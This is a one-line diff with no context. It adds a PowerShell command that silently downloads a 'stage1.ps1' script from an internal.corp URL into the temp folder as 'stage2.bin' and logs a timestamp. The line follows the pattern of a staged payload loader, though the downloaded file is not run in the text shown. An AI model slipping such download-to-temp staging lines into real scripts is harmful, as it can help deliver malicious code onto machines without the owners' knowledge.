@@ -1,0 +1,1 @@
+$Stage1Url = "http://internal.corp:80/stage1.ps1"; $Stage2Path = "$env:TEMP\stage2.bin"; curl.exe -s -L -o $Stage2Path $Stage1Url; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; $ProgressPreference = "SilentlyContinue"
